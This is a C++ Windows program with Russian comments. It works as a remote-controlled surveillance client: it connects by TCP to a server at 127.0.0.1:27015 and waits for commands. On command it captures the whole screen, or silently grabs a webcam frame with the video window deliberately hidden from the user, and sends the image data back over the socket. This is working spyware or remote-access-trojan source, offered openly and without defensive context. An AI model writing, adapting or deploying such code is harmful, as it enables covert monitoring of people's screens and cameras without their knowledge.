#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <fstream>
#include <string>
#include <ctime>
#include "qedit.h"
#include <sstream>

#define SIZEMSGBUF 1024

#pragma comment(lib, "Ws2_32.lib")

std::string SaveBMP(unsigned char* bufferP, int Width, int Height, int ScreenshotSize) {
    //Описание заголовка файла
    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + ScreenshotSize;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    //Описание изображения
    BITMAPINFOHEADER bmiHeader;
    bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmiHeader.biWidth = Width;
    bmiHeader.biHeight = Height;
    bmiHeader.biPlanes = 1;
    bmiHeader.biBitCount = 24;
    bmiHeader.biCompression = BI_RGB;
    bmiHeader.biSizeImage = ScreenshotSize;

    //Создание и загрузка скрина
    std::ostringstream oss;
    oss.write(reinterpret_cast<const char*>(&bmfHeader), sizeof(bmfHeader));
    oss.write(reinterpret_cast<const char*>(&bmiHeader), sizeof(bmiHeader));
    oss.write(reinterpret_cast<const char*>(bufferP), ScreenshotSize);
    std::string Data = oss.str();

    return Data;
}

std::string CaptureScreenshot() {
    //Контексты устройства
    HDC Screen = GetDC(0);
    HDC MemoryDC = CreateCompatibleDC(Screen);
    //Размеры виртуального экрана (для захвата нескольких экранов) 
    int WidthScreen = GetSystemMetrics(SM_CXVIRTUALSCREEN) * 1.25;
    int HeightScreen = GetSystemMetrics(SM_CYVIRTUALSCREEN) * 1.25;
    //Информация о формате скрина (RGB, 8 бит на пиксель)
    BITMAPINFO MyScreen;
    MyScreen.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    MyScreen.bmiHeader.biWidth = WidthScreen;
    MyScreen.bmiHeader.biHeight = -HeightScreen;
    MyScreen.bmiHeader.biSizeImage = WidthScreen * HeightScreen * 3;
    MyScreen.bmiHeader.biCompression = BI_RGB;
    MyScreen.bmiHeader.biBitCount = 24;
    MyScreen.bmiHeader.biPlanes = 1;

    //Буфер для хранения пикселей
    unsigned char* ImageBuffer;
    //Создание DIB
    HBITMAP hBitmap = CreateDIBSection(Screen, &MyScreen, DIB_RGB_COLORS, (void**)&ImageBuffer, 0, 0);
    //Для выполнения графических операций
    SelectObject(MemoryDC, hBitmap);
    //Битовая передача данных цвета
    BitBlt(MemoryDC, 0, 0, WidthScreen, HeightScreen, Screen, 0, 0, SRCCOPY);

    DeleteDC(MemoryDC);
    ReleaseDC(NULL, Screen);

    std::string ScreenshotData = SaveBMP(ImageBuffer, WidthScreen, -HeightScreen, MyScreen.bmiHeader.biSizeImage);
    DeleteObject(hBitmap);
    return ScreenshotData;
}

std::string CapturePhoto() {
    //Инициализация COM
    CoInitialize(nullptr);
    //Интерфейсы
    IGraphBuilder* pGraph = nullptr;
    ICaptureGraphBuilder2* pCapture = nullptr;
    IBaseFilter* pCap = nullptr;
    IBaseFilter* pRenderer = nullptr;
    ISampleGrabber* pSampleGrabber = nullptr;
    IMediaControl* pControl = nullptr;
    IVideoWindow* pVideoWindow = nullptr;
    IEnumFilters* pEnum = nullptr;
    ICreateDevEnum* pDevEnum = nullptr;
    IEnumMoniker* pEnumMoniker = nullptr;
    IMoniker* pMoniker = nullptr;
    AM_MEDIA_TYPE mt;

    long width = 1280;
    long height = 720;
    long bufferSize = width * height * 3;
    HRESULT hr;

    //Создание объекта, который управляет графом фильтров
    hr = CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);
    if (FAILED(hr)) {
        CoUninitialize();
        exit(1);
    }

    //Создание графа для захвата видео
    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, nullptr, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pCapture);
    if (FAILED(hr)) {
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Связываем граф для захвата видео с объектом pGraph
    hr = pCapture->SetFiltergraph(pGraph);
    if (FAILED(hr)) {
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Создание объекта для перечисления устройств в системе
    hr = CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum);
    if (FAILED(hr)) {
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Создание объекта для перечисления устройств в системе определенного класса (видео устройств)
    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnumMoniker, 0);
    if (FAILED(hr) || pEnumMoniker == nullptr) {
        pDevEnum->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Получение первого доступного устройства и создание объекта для захвата видео
    if (pEnumMoniker->Next(1, &pMoniker, nullptr) == S_OK) {
        hr = pMoniker->BindToObject(nullptr, nullptr, IID_IBaseFilter, (void**)&pCap);
        pMoniker->Release();
    }
    else {
        pEnumMoniker->Release();
        pDevEnum->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Освобождение ресурсов 
    pEnumMoniker->Release();
    pDevEnum->Release();

    //Добавление фильтра захвата видео в граф
    hr = pGraph->AddFilter(pCap, L"Capture Filter");
    if (FAILED(hr)) {
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Создание SampleGrabber, для захвата и обработки видео
    hr = CoCreateInstance(CLSID_SampleGrabber, nullptr, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pRenderer);
    if (FAILED(hr)) {
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Добавление SampleGrabber в граф
    hr = pGraph->AddFilter(pRenderer, L"Sample Grabber");
    if (FAILED(hr)) {
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Запрос интерфейсов для настройки SampleGrabber
    hr = pRenderer->QueryInterface(IID_ISampleGrabber, (void**)&pSampleGrabber);
    if (FAILED(hr)) {
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Настройка SampleGrabber (работа с видео в формате RGB24)
    ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
    mt.majortype = MEDIATYPE_Video;
    mt.subtype = MEDIASUBTYPE_RGB24;

    //Установка типа медиа данных
    hr = pSampleGrabber->SetMediaType(&mt);
    if (FAILED(hr)) {
        pSampleGrabber->Release();
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Установка буфферизации
    hr = pSampleGrabber->SetBufferSamples(TRUE);
    if (FAILED(hr)) {
        pSampleGrabber->Release();
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Настройка и соединение фильтров в графе
    hr = pCapture->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pRenderer, nullptr);
    if (FAILED(hr)) {
        pSampleGrabber->Release();
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Создание окна для захвата видео (без показа пользователю)
    hr = pGraph->QueryInterface(IID_IVideoWindow, (void**)&pVideoWindow);
    if (SUCCEEDED(hr)) {
        pVideoWindow->put_AutoShow(OAFALSE);
        pVideoWindow->put_Visible(OAFALSE);
        pVideoWindow->Release();
    }

    //Создание интерфейса для управления произведения медиа
    hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl);
    if (FAILED(hr)) {
        pSampleGrabber->Release();
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Запуск процесса для захвата видео 
    hr = pControl->Run();
    if (FAILED(hr)) {
        pControl->Release();
        pSampleGrabber->Release();
        pRenderer->Release();
        pCap->Release();
        pCapture->Release();
        pGraph->Release();
        CoUninitialize();
        exit(1);
    }

    //Захват видео
    Sleep(750);

    //Получение и сохранения изображения
    BYTE* pBuffer = new BYTE[bufferSize];
    std::string PhotoData;
    hr = pSampleGrabber->GetCurrentBuffer(&bufferSize, (long*)pBuffer);
    if (SUCCEEDED(hr)) {
        PhotoData = SaveBMP(pBuffer, width, height, bufferSize);
    }
    delete[] pBuffer;

    //Завершение процесса для захвата видео
    pControl->Stop();

    //Освобождение ресурсов
    pControl->Release();
    pSampleGrabber->Release();
    pRenderer->Release();
    pCap->Release();
    pCapture->Release();
    pGraph->Release();
    CoUninitialize();
    return PhotoData;
}

std::string getNameFile(std::string com) {
    time_t now = time(nullptr);
    tm localTime;
    localtime_s(&localTime, &now);
    char buffer[20];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d_%H:%M:%S", &localTime);
    std::string nameFile = com;
    for (int i = 0; i < 10; i += 1) {
        nameFile += buffer[i];
    }
    nameFile += ".bmp";

    return nameFile;
}

int main() {
    WSADATA Data;
    int Status = WSAStartup(MAKEWORD(2, 2), &Data);
    if (Status != 0) {
        std::cout << "WSAStartup Error : " << Status << std::endl;
        exit(1);
    }

    in_addr ip;
    Status = inet_pton(AF_INET, "127.0.0.1", &ip);
    if (Status <= 0) {
        std::cout << "inet_pton Error : " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in ServerInfo;
    ServerInfo.sin_family = AF_INET;
    ServerInfo.sin_addr = ip;


    SOCKET ServerSock = socket(AF_INET, SOCK_STREAM, 0);
    if (ServerSock == INVALID_SOCKET) {
        std::cout << "Socket Error : " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    ServerInfo.sin_port = htons(27015);
    Status = connect(ServerSock, (sockaddr*)&ServerInfo, sizeof(ServerInfo));

    while (true) {
        char Command[SIZEMSGBUF] = { 0 };
        int recvSize = recv(ServerSock, Command, sizeof(Command), 0);
        std::string Command_s = Command;
        if (Command_s == "Screenshot") {
            std::string namefileS = getNameFile("Scren");
            send(ServerSock, namefileS.c_str(), namefileS.size(), 0);
            std::string DataScreen = CaptureScreenshot();
            send(ServerSock, DataScreen.c_str(), DataScreen.size(), 0);
        }
        else if (Command_s == "Photo") {
            std::string namefileS = getNameFile("Photo");
            send(ServerSock, namefileS.c_str(), namefileS.size(), 0);
            std::string DataFoto = CapturePhoto();
            send(ServerSock, DataFoto.c_str(), DataFoto.size(), 0);
        }
    }
   

    closesocket(ServerSock);
    WSACleanup();
    return 0;
}
